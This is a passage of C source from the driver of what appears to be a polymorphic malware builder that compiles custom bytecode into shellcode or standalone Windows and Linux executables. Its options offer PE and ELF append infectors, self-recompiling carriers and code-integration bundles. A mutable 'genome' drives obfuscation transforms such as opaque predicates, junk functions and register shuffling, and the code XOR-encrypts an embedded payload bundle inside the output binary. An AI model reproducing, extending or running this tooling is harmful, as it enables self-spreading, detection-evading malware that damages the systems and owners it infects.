        fprintf(stderr, "Output (combinable):\n");
        fprintf(stderr, "  --pic <out.bin>\n");
        fprintf(stderr, "      PIC shellcode of input.mcb\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "  --pe-standalone <out.exe>\n");
        fprintf(stderr, "      Standalone Win32 PE of input.mcb (real IAT, no loader)\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "  --elf-standalone <out>\n");
        fprintf(stderr, "      Standalone static Linux ELF of input.mcb (syscall wrappers, no loader)\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "  --transform-ir <out.mcb>\n");
        fprintf(stderr, "      Emit post-transform IR bytecode (debug aid)\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "Bundle: assemble input.mcb as the embedded payload of a pre-built carrier.\n");
        fprintf(stderr, "input.mcb is optional. omit it to build a gen0 binary with no embedded payload.\n");
        fprintf(stderr, "\n");
         fprintf(stderr, "  --recompiler-pe  <out.exe>   self-recompiling Win32 PE\n");
        fprintf(stderr, "  --recompiler-elf <out>       self-recompiling Linux ELF\n");
        fprintf(stderr, "  --infector-pe    <out.exe>   PE append infector\n");
        fprintf(stderr, "  --infector-elf   <out>       ELF append infector (PT_NOTE -> PT_LOAD)\n");
        fprintf(stderr, "  --integrator-pe  <out.exe>   PE code-integration bundle (MystiqueFall)\n");
        fprintf(stderr, "  --integrator-elf <out>       ELF code-integration bundle (LacriMystique)\n");
        fprintf(stderr, "  --bundles-dir <path>         bundles/ root (default: ./bundles)\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "PRNG:\n");
        fprintf(stderr, "  --seed N                     seed value (default: time-based)\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "Genome:\n");
        fprintf(stderr, "  --genome <file.json>         load genome from JSON\n");
        fprintf(stderr, "  --genome-mutate              mutate genome before compiling\n");
        fprintf(stderr, "  --genome-temperature N       mutation strength 0-100 (default: 50)\n");
        fprintf(stderr, "  --genome-out <file.json>     save genome to JSON after compilation\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "IR transforms (off by default, each flag enables one):\n");
        fprintf(stderr, "  --ir-obfuscate-names         randomize function/label names\n");
        fprintf(stderr, "  --ir-unfold                  constant unfolding\n");
        fprintf(stderr, "  --ir-substitute              instruction substitution\n");
        fprintf(stderr, "  --ir-deadcode                dead code insertion\n");
        fprintf(stderr, "  --ir-nops                    NOP insertion\n");
        fprintf(stderr, "  --ir-reorder-instrs          reorder independent instructions\n");
        fprintf(stderr, "  --ir-reorder-locals          permute local variable indices\n");
        fprintf(stderr, "  --ir-reorder-blocks          reorder basic blocks\n");
        fprintf(stderr, "  --ir-reorder-funcs           shuffle function order\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "x86 transforms (off by default, each flag enables one):\n");
        fprintf(stderr, "  --x86-poly-instrs            register shuffle + poly encoding\n");
        fprintf(stderr, "  --x86-dead-code              dead bytes between blocks/instructions\n");
        fprintf(stderr, "  --x86-opaque                 opaque predicate insertion\n");
        fprintf(stderr, "  --x86-junk-funcs             junk function generation + calls\n");
        fprintf(stderr, "  --x86-harmless-calls         harmless API/syscall wrapper calls\n");
        fprintf(stderr, "  --x86-shuffle-funcs          shuffle function layout in binary\n");
        fprintf(stderr, "\n");
        fprintf(stderr, "Debug:\n");
        fprintf(stderr, "  -v                           verbose output\n");
        fprintf(stderr, "  --debug-transform            trace transform decisions to stderr\n");
        return 1;
    }

    // Derive addressing mode: absolute for standalone PE/ELF, PIC for shellcode-based outputs
    int abs_mode = 0;
    if (out_pe_standalone) abs_mode = 1;
    else if (out_elf_standalone) abs_mode = 2;
    int pic_mode = (abs_mode == 0 && out_pic) ? 1 : 0;

    // Load genome (default if no --genome flag)
    g_genome = genome_file ? load_genome_file(genome_file) : default_genome();
    g_genome_ptr = &g_genome;

    // Set temperature: CLI flag overrides binary-embedded value
    if (genome_temperature_set) {
        g_genome_temperature = clamp_temperature(genome_temperature_arg);
    }

    // Mutate genome if requested
    if (genome_mutate) {
        struct Prng mut_prng;
        prng_seed(&mut_prng, seed ^ 0x4D555421);  // "MUT!" - different stream than compilation PRNG
        mutate_genome(&g_genome, &mut_prng, g_genome_temperature);
        // Self-adaptive: mutate temperature itself
        {
            int t_step = 1 + g_genome_temperature / 20;
            int t_delta = prng_range(&mut_prng, 2 * t_step + 1) - t_step;
            g_genome_temperature = clamp_temperature(g_genome_temperature + t_delta);
        }
        if (verbose) {
            fprintf(stderr, "Genome mutated (temperature=%d)\n", g_genome_temperature);
        }
    }

    // Save genome if requested
    if (genome_out_file) {
        save_genome_json(&g_genome, genome_out_file);
        if (verbose) {
            fprintf(stderr, "Genome saved to: %s\n", genome_out_file);
        }
    }

    if (verbose && genome_file) {
        fprintf(stderr, "Genome loaded from: %s\n", genome_file);
        fprintf(stderr, "  unfold_chance=%d substitute_chance=%d dead_code_chance=%d nop_chance=%d\n",
                g_genome.unfold_chance, g_genome.substitute_chance,
                g_genome.dead_code_chance, g_genome.nop_chance);
    }

    // Apply gene expression: mask transform flags by expression_flags bitmask
    // Bit mapping: 0=obfuscate_names, 1=unfold, 2=substitute, 3=deadcode,
    // 4=nops, 5=schedule, 6=reorder_locals, 7=reorder_blocks, 8=reorder_funcs,
    // 9=poly_instrs, 10=dead_code_x86, 11=opaque, 12=junk_funcs,
    // 13=harmless_calls, 14=shuffle_funcs
    {
        int ef = g_genome.expression_flags;
        if (!(ef & (1 << 0)))  ir_obfuscate_names = 0;
        if (!(ef & (1 << 1)))  ir_unfold = 0;
        if (!(ef & (1 << 2)))  ir_substitute = 0;
        if (!(ef & (1 << 3)))  ir_deadcode = 0;
        if (!(ef & (1 << 4)))  ir_nops = 0;
        if (!(ef & (1 << 5)))  ir_reorder_instrs = 0;
        if (!(ef & (1 << 6)))  ir_reorder_locals = 0;
        if (!(ef & (1 << 7)))  ir_reorder_blocks = 0;
        if (!(ef & (1 << 8)))  ir_reorder_funcs = 0;
        if (!(ef & (1 << 9)))  x86_poly_instrs = 0;
        if (!(ef & (1 << 10))) x86_dead_code = 0;
        if (!(ef & (1 << 11))) x86_opaque = 0;
        if (!(ef & (1 << 12))) x86_junk_funcs = 0;
        if (!(ef & (1 << 13))) x86_harmless_calls = 0;
        if (!(ef & (1 << 14))) x86_shuffle_funcs = 0;
        if (verbose) {
            fprintf(stderr, "Gene expression: flags=0x%04X rate=%d%%\n",
                    ef, g_genome.expression_rate);
        }
    }

    // Read input file
    FILE* f = fopen(input_file, "rb");
    if (!f) {
        fprintf(stderr, "Cannot open input file: %s\n", input_file);
        return 1;
    }

    fseek(f, 0, SEEK_END);
    int file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    char* input_data = (char*)malloc(file_size);
    fread(input_data, 1, file_size, f);
    fclose(f);

    if (verbose) {
        printf("Input: %s (%d bytes)\n", input_file, file_size);
    }

    // Parse bytecode
    struct Module* mod = parse_bytecode(input_data, file_size);
    if (!mod) {
        fprintf(stderr, "Failed to parse bytecode\n");
        return 1;
    }

    if (verbose) {
        printf("Parsed: %d strings, %d globals, %d functions\n",
               mod->string_count, mod->global_count, mod->func_count);
        printf("Entry function: %s (index %d)\n",
               mod->funcs[mod->entry_func].name, mod->entry_func);
    }

    // Initialize PRNG
    struct Prng prng;
    prng_seed(&prng, seed);

    // Permute extern api_slot values per seed (under --ir-reorder-funcs).
    // Skipped in ELF abs mode (CF_ABS_ELF / abs_mode==2) because the
    // syscall wrapper builder hardcodes wrapper bodies per slot index.
    if (ir_reorder_funcs && abs_mode != 2) {
        permute_api_slots(mod, &prng);
    }

    // IR transform: name obfuscation
    if (ir_obfuscate_names) {
        randomize_names(mod, &prng);
    }

    // Build IR transform config from command-line flags
    struct TransformConfig ir_cfg;
    {
        struct TransformConfig def = default_transform_config();
        ir_cfg.dead_code_chance       = def.dead_code_chance;
        ir_cfg.constant_unfold_chance = def.constant_unfold_chance;
        ir_cfg.instr_sub_chance       = def.instr_sub_chance;
        ir_cfg.nop_insert_chance      = def.nop_insert_chance;
        ir_cfg.enable_unfold          = ir_unfold;
        ir_cfg.enable_substitute      = ir_substitute;
        ir_cfg.enable_dead_code       = ir_deadcode;
        ir_cfg.enable_nops            = ir_nops;
        ir_cfg.enable_reorder_instrs  = ir_reorder_instrs;
        ir_cfg.enable_reorder         = ir_reorder_blocks;
        ir_cfg.enable_reorder_locals  = ir_reorder_locals;
        ir_cfg.enable_reorder_funcs   = ir_reorder_funcs;
    }

    if (verbose) {
        fprintf(stderr, "IR transforms: names=%d unfold=%d sub=%d dead=%d nops=%d "
                "reorder_instrs=%d reorder_blocks=%d reorder_locals=%d reorder_funcs=%d\n",
                ir_obfuscate_names, ir_unfold, ir_substitute, ir_deadcode, ir_nops,
                ir_reorder_instrs, ir_reorder_blocks, ir_reorder_locals, ir_reorder_funcs);
    }

    // Apply IR-level transformations to the program
    optimize_module(mod, verbose);
    transform_module(mod, &prng, verbose, &ir_cfg);
    optimize_module_random(mod, &prng, verbose);

    // --transform-ir: emit post-transform program IR
    if (out_transform_ir) {
        emit_bytecode(mod, out_transform_ir, verbose);
    }

    // Generate code
    struct CodeGen cg;
    struct X86Config x86_cfg = {0};
    x86_cfg.poly_instrs    = x86_poly_instrs;
    x86_cfg.dead_code      = x86_dead_code;
    x86_cfg.opaque         = x86_opaque;
    x86_cfg.junk_funcs     = x86_junk_funcs;
    x86_cfg.harmless_calls = x86_harmless_calls;
    x86_cfg.shuffle_funcs  = x86_shuffle_funcs;
    codegen_init(&cg, mod, &prng, pic_mode, abs_mode, x86_cfg);
    if (annotate_file) annot_open(annotate_file, (unsigned int)seed);
    gen_module(&cg);
    annot_close();

    if (verbose) {
        printf("Generated: %d bytes of code, %d bytes of data\n",
               cg.code->len, cg.data->len);
    }

    // Write output
    int entry_offset = cg.func_offsets[mod->entry_func];

    // Build extern info (needed by all shellcode-based outputs)
    int extern_count = 0;
    struct Buffer* extern_info = NULL;
    if (pic_mode) {
        // extern_count = max api_slot + 1 (defines API table size)
        for (int i = 0; i < mod->func_count; i++) {
            if (mod->funcs[i].block_count == 0 && mod->funcs[i].api_slot + 1 > extern_count)
                extern_count = mod->funcs[i].api_slot + 1;
        }
        // Write ALL externs to extern_info (loader resolves by name)
        // Format: [slot_count:4] [dll_name\0 func_name\0] ...
        // One entry per slot 0..extern_count-1. Empty slots get empty names.
        extern_info = buf_new(256);
        buf_write_u32(extern_info, extern_count);
        for (int slot = 0; slot < extern_count; slot++) {
            int found = 0;
            for (int i = 0; i < mod->func_count; i++) {
                if (mod->funcs[i].api_slot == slot && mod->funcs[i].block_count == 0) {
                    char* dll_name  = mod->funcs[i].dll_name;
                    char* func_name = mod->funcs[i].name;
                    if (dll_name) {
                        int dlen = 0; while (dll_name[dlen]) dlen++;
                        buf_write_bytes(extern_info, dll_name, dlen + 1);
                    } else {
                        buf_write_u8(extern_info, 0);
                    }
                    int flen = 0; while (func_name[flen]) flen++;
                    buf_write_bytes(extern_info, func_name, flen + 1);
                    found = 1;
                    break;
                }
            }
            if (!found) {
                // Empty slot placeholder (dll_name="" func_name="")
                buf_write_u8(extern_info, 0);
                buf_write_u8(extern_info, 0);
            }
        }
        if (verbose) {
            printf("Shellcode: entry_offset=%d code=%d data=%d externs=%d\n",
                   entry_offset, cg.code->len, cg.data->len, extern_count);
        }
    }

    // --pe-standalone: standalone PE with real IAT
    // Auto-embed: if module has g_bundle_header global, embed input .mcb + engine + payload + genome in .data
    if (out_pe_standalone) {
        int has_bundle_globals = 0;
        int bundle_header_goff = -1;
        int bundle_start = 0;
        int bundle_header_off_pe = -1;  // .data offset where the new BundleHeader is emitted
        for (int gi = 0; gi < mod->global_count; gi++) {
            if (!mod->globals[gi].name) continue;
            if (strcmp(mod->globals[gi].name, "g_bundle_header") == 0)   { bundle_header_goff = cg.global_offsets[gi]; has_bundle_globals = 1; }
        }

        if (has_bundle_globals) {
            // Read input .mcb for embedding
            int embed_mcb_sz = 0;
            char* embed_mcb = read_file_data(input_file, &embed_mcb_sz);

            // Read optional engine .mcb (4-component layout: entry | engine | payload | genome)
            int embed_eng_sz = 0;
            char* embed_eng = NULL;
            if (out_engine_mcb && strcmp(out_engine_mcb, "-") != 0) {
                embed_eng = read_file_data(out_engine_mcb, &embed_eng_sz);
            }

            // Read optional payload .mcb
            int embed_pay_sz = 0;
            char* embed_pay = NULL;
            if (out_payload_mcb && strcmp(out_payload_mcb, "-") != 0) {
                embed_pay = read_file_data(out_payload_mcb, &embed_pay_sz);
            }

            // Serialize the active genome (loaded from --genome file, or
            // default_genome()). Previously this was a zero-filled stub which
            // disabled all transforms via expression_flags=0; using the real
            // genome gives meaningful polymorphism from gen 1 onward.
            int embed_gen_sz = 0;
            char* embed_gen = genome_to_binary(&g_genome, &embed_gen_sz);

            // Append components to .data
            bundle_start = cg.data->len;
            buf_write_bytes(cg.data, embed_mcb, embed_mcb_sz);
            if (embed_eng_sz > 0) buf_write_bytes(cg.data, embed_eng, embed_eng_sz);
            if (embed_pay_sz > 0) buf_write_bytes(cg.data, embed_pay, embed_pay_sz);
            buf_write_bytes(cg.data, embed_gen, embed_gen_sz);

            // XOR-encrypt the embedded bundle (key derived from PRNG so output is
            // deterministic for a given --seed; gen0 polymorphism still comes
            // from the PRNG itself, not wall-clock drift).
            unsigned int bk_pe = 0;
            int bundle_total_pe = embed_mcb_sz + embed_eng_sz + embed_pay_sz + embed_gen_sz;
            {
                unsigned int bk = (unsigned int)prng_next(&prng) ^ (unsigned int)bundle_start;
                if (bk == 0) bk = 0x12345678;
                char* kb = (char*)&bk;
                for (int bi = 0; bi < bundle_total_pe; bi++)
                    cg.data->data[bundle_start + bi] ^= kb[bi & 3];
                bk_pe = bk;
            }

            // Append BundleHeader + descriptors AFTER components. Header is plaintext;
            // base_addr + g_bundle_header get post-patched with absolute VAs after PE layout.
            {
                int n_desc = (embed_eng_sz > 0) ? 2 : 1;   // ENTRY+ENGINE or single CARRIER
                if (embed_pay_sz > 0) n_desc++;
                n_desc++;  // BC_GENOME always present
                int header_total = 32 + n_desc * 16;
                /* 4-align so runtime int loads of header fields work */
                while (cg.data->len & 3) buf_write_u8(cg.data, 0);
                bundle_header_off_pe = cg.data->len;
                for (int hi = 0; hi < header_total; hi++) buf_write_u8(cg.data, 0);
                char* hp = cg.data->data + bundle_header_off_pe;
                *(int*)(hp +  0) = 0x4154454D;   /* META_MAGIC */
                *(int*)(hp +  4) = 1;             /* META_VERSION */
                *(int*)(hp +  8) = header_total;
                *(int*)(hp + 12) = n_desc;
                /* hp+16: base_addr — post-patched after PE layout */
                *(int*)(hp + 20) = bundle_total_pe;
                *(int*)(hp + 24) = (int)bk_pe;
                *(int*)(hp + 28) = 0;
                int di = 0;
                int boff = 0;
                if (embed_eng_sz > 0) {
                    *(int*)(hp + 32 + di*16 +  0) = 2;    /* BC_ENTRY */
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = embed_mcb_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += embed_mcb_sz;
                    *(int*)(hp + 32 + di*16 +  0) = 3;    /* BC_ENGINE */
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = embed_eng_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += embed_eng_sz;
                } else {
                    *(int*)(hp + 32 + di*16 +  0) = 1;    /* BC_CARRIER */
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = embed_mcb_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += embed_mcb_sz;
                }
                if (embed_pay_sz > 0) {
                    *(int*)(hp + 32 + di*16 +  0) = 4;    /* BC_PAYLOAD */
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = embed_pay_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += embed_pay_sz;
                }
                *(int*)(hp + 32 + di*16 +  0) = 5;        /* BC_GENOME */
                *(int*)(hp + 32 + di*16 +  4) = boff;
                *(int*)(hp + 32 + di*16 +  8) = embed_gen_sz;
                *(int*)(hp + 32 + di*16 + 12) = 1;
            }

            fprintf(stderr, "  Auto-embed: mcb=%d payload=%d genome=%d bundle_start=%d header_off=%d\n",
                    embed_mcb_sz, embed_pay_sz, embed_gen_sz, bundle_start, bundle_header_off_pe);

            free(embed_mcb);
            if (embed_pay) free(embed_pay);
            free(embed_gen);
        }

        write_pe_standalone(&cg, entry_offset, out_pe_standalone);
        fprintf(stderr, "Output (pe-standalone): %s\n", out_pe_standalone);

        if (has_bundle_globals && bundle_header_goff >= 0 && bundle_header_off_pe >= 0) {
            // Post-patch g_bundle_header (absolute VA of header) + header.base_addr
            // (absolute VA of encrypted bundle bytes). Re-open PE, parse header, find
            // .data, write the two slots.
            FILE* pf = fopen(out_pe_standalone, "r+b");
            if (pf) {
                unsigned char hdr[512];
                fread(hdr, 1, 512, pf);
                int pe_off = *(int*)(hdr + 0x3C);
                int num_sec = *(unsigned short*)(hdr + pe_off + 6);
                int opt_off = pe_off + 24;
                int img_base = *(int*)(hdr + opt_off + 28);
                int sec_base = opt_off + 224;
                for (int si = 0; si < num_sec; si++) {
                    if (hdr[sec_base + si*40] == '.' && hdr[sec_base + si*40 + 1] == 'd') {
                        int drva = *(int*)(hdr + sec_base + si*40 + 12);
                        int draw = *(int*)(hdr + sec_base + si*40 + 20);
                        int bundle_abs = img_base + drva + bundle_start;
                        int header_abs = img_base + drva + bundle_header_off_pe;
                        fseek(pf, draw + bundle_header_goff, SEEK_SET);
                        fwrite(&header_abs, 4, 1, pf);
                        // header.base_addr lives at header_off + 16
                        fseek(pf, draw + bundle_header_off_pe + 16, SEEK_SET);
                        fwrite(&bundle_abs, 4, 1, pf);
                        fprintf(stderr, "  Post-patch g_bundle_header: 0x%x header.base_addr: 0x%x\n",
                                header_abs, bundle_abs);
                        break;
                    }
                }
                fclose(pf);
            }
        }
    }

    // --elf-standalone: standalone static ELF with syscall wrappers
    // Auto-embed: if module has g_bundle_header global, embed input .mcb + engine + payload + genome in .data
    if (out_elf_standalone) {
        int elf_has_bundle = 0;
        int elf_bundle_header_goff = -1;
        int elf_bundle_start = 0;
        int elf_bundle_header_off = -1;
        for (int gi = 0; gi < mod->global_count; gi++) {
            if (!mod->globals[gi].name) continue;
            if (strcmp(mod->globals[gi].name, "g_bundle_header") == 0)   { elf_bundle_header_goff = cg.global_offsets[gi]; elf_has_bundle = 1; }
        }
        if (elf_has_bundle) {
            int elf_mcb_sz = 0;
            char* elf_mcb = read_file_data(input_file, &elf_mcb_sz);
            int elf_eng_sz = 0;
            char* elf_eng = NULL;
            if (out_engine_mcb && strcmp(out_engine_mcb, "-") != 0)
                elf_eng = read_file_data(out_engine_mcb, &elf_eng_sz);
            int elf_pay_sz = 0;
            char* elf_pay = NULL;
            if (out_payload_mcb && strcmp(out_payload_mcb, "-") != 0)
                elf_pay = read_file_data(out_payload_mcb, &elf_pay_sz);
            int elf_gen_sz = 138;
            char* elf_gen = (char*)calloc(1, elf_gen_sz);
            elf_gen[0] = 'G'; elf_gen[1] = 'E'; elf_gen[2] = 'N'; elf_gen[3] = 'E';
            elf_gen[4] = 1; elf_gen[6] = 50;

            elf_bundle_start = cg.data->len;
            buf_write_bytes(cg.data, elf_mcb, elf_mcb_sz);
            if (elf_eng_sz > 0) buf_write_bytes(cg.data, elf_eng, elf_eng_sz);
            if (elf_pay_sz > 0) buf_write_bytes(cg.data, elf_pay, elf_pay_sz);
            buf_write_bytes(cg.data, elf_gen, elf_gen_sz);

            // XOR-encrypt the embedded bundle. Mirror of the PE auto-embed
            // block above: key derived from PRNG XOR bundle_start so the
            // output is deterministic for a given --seed.
            unsigned int bk_elf = 0;
            int bundle_total_elf = elf_mcb_sz + elf_eng_sz + elf_pay_sz + elf_gen_sz;
            {
                unsigned int bk = (unsigned int)prng_next(&prng) ^ (unsigned int)elf_bundle_start;
                if (bk == 0) bk = 0x12345678;
                char* kb = (char*)&bk;
                for (int bi = 0; bi < bundle_total_elf; bi++)
                    cg.data->data[elf_bundle_start + bi] ^= kb[bi & 3];
                bk_elf = bk;
            }

            // Append BundleHeader + descriptors. base_addr + g_bundle_header are
            // post-patched with absolute VAs after ELF layout.
            {
                int n_desc = (elf_eng_sz > 0) ? 2 : 1;
                if (elf_pay_sz > 0) n_desc++;
                n_desc++;
                int header_total = 32 + n_desc * 16;
                while (cg.data->len & 3) buf_write_u8(cg.data, 0);
                elf_bundle_header_off = cg.data->len;
                for (int hi = 0; hi < header_total; hi++) buf_write_u8(cg.data, 0);
                char* hp = cg.data->data + elf_bundle_header_off;
                *(int*)(hp +  0) = 0x4154454D;   /* META_MAGIC */
                *(int*)(hp +  4) = 1;             /* META_VERSION */
                *(int*)(hp +  8) = header_total;
                *(int*)(hp + 12) = n_desc;
                /* hp+16: base_addr — post-patched */
                *(int*)(hp + 20) = bundle_total_elf;
                *(int*)(hp + 24) = (int)bk_elf;
                *(int*)(hp + 28) = 0;
                int di = 0;
                int boff = 0;
                if (elf_eng_sz > 0) {
                    *(int*)(hp + 32 + di*16 +  0) = 2;
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = elf_mcb_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += elf_mcb_sz;
                    *(int*)(hp + 32 + di*16 +  0) = 3;
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = elf_eng_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += elf_eng_sz;
                } else {
                    *(int*)(hp + 32 + di*16 +  0) = 1;
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = elf_mcb_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += elf_mcb_sz;
                }
                if (elf_pay_sz > 0) {
                    *(int*)(hp + 32 + di*16 +  0) = 4;
                    *(int*)(hp + 32 + di*16 +  4) = boff;
                    *(int*)(hp + 32 + di*16 +  8) = elf_pay_sz;
                    *(int*)(hp + 32 + di*16 + 12) = 1;
                    di++; boff += elf_pay_sz;
                }
                *(int*)(hp + 32 + di*16 +  0) = 5;
                *(int*)(hp + 32 + di*16 +  4) = boff;
                *(int*)(hp + 32 + di*16 +  8) = elf_gen_sz;
                *(int*)(hp + 32 + di*16 + 12) = 1;
            }

            fprintf(stderr, "  ELF auto-embed: mcb=%d payload=%d genome=%d bundle_start=%d header_off=%d\n",
                    elf_mcb_sz, elf_pay_sz, elf_gen_sz, elf_bundle_start, elf_bundle_header_off);
            free(elf_mcb);
            if (elf_pay) free(elf_pay);
            free(elf_gen);
        }

        write_elf_standalone(&cg, entry_offset, out_elf_standalone);
        fprintf(stderr, "Output (elf-standalone): %s\n", out_elf_standalone);

        if (elf_has_bundle && elf_bundle_header_goff >= 0 && elf_bundle_header_off >= 0) {
            // Post-patch g_bundle_header (absolute VA of header) + header.base_addr
            // (absolute VA of encrypted bundle bytes).
            FILE* ef = fopen(out_elf_standalone, "r+b");
            if (ef) {
                unsigned char ehdr[64];
                fread(ehdr, 1, 52, ef);
                int ph_off = *(int*)(ehdr + 28);
                int ph_num = *(unsigned short*)(ehdr + 44);
                for (int si = 0; si < ph_num; si++) {
                    unsigned char ph[32];
                    fseek(ef, ph_off + si * 32, SEEK_SET);
                    fread(ph, 1, 32, ef);
                    int p_type = *(int*)(ph + 0);
                    int p_offset = *(int*)(ph + 4);
                    int p_vaddr = *(int*)(ph + 8);
                    int p_flags = *(int*)(ph + 24);
                    if (p_type == 1 && (p_flags & 2) && !(p_flags & 1)) {
                        // RW segment = .data
                        int bundle_abs = p_vaddr + elf_bundle_start;
                        int header_abs = p_vaddr + elf_bundle_header_off;
                        fseek(ef, p_offset + elf_bundle_header_goff, SEEK_SET);
                        fwrite(&header_abs, 4, 1, ef);
                        fseek(ef, p_offset + elf_bundle_header_off + 16, SEEK_SET);
                        fwrite(&bundle_abs, 4, 1, ef);
                        fprintf(stderr, "  ELF post-patch g_bundle_header: 0x%x header.base_addr: 0x%x\n",
                                header_abs, bundle_abs);
                        break;
                    }
                }
                fclose(ef);
            }
        }
    }

    // --pic: raw shellcode
    if (out_pic) {
        FILE* out = fopen(out_pic, "wb");
        if (!out) {
            fprintf(stderr, "Cannot open output: %s\n", out_pic);
        } else {
            fwrite(&entry_offset,    4, 1, out);
            fwrite(&cg.code->len,    4, 1, out);
            fwrite(&cg.data->len,    4, 1, out);
            fwrite(&extern_count,    4, 1, out);
            fwrite(&extern_info->len, 4, 1, out);
            fwrite(cg.code->data, 1, cg.code->len, out);
            if (cg.data->len > 0) fwrite(cg.data->data, 1, cg.data->len, out);
            if (extern_info->len > 0) fwrite(extern_info->data, 1, extern_info->len, out);
            fclose(out);
            fprintf(stderr, "Output (pic): %s\n", out_pic);
        }
    }

    if (extern_info) buf_free(extern_info);

    // Cleanup
    free(input_data);
    buf_free(cg.code);
    buf_free(cg.data);
    free(cg.func_offsets);

    return 0;
}
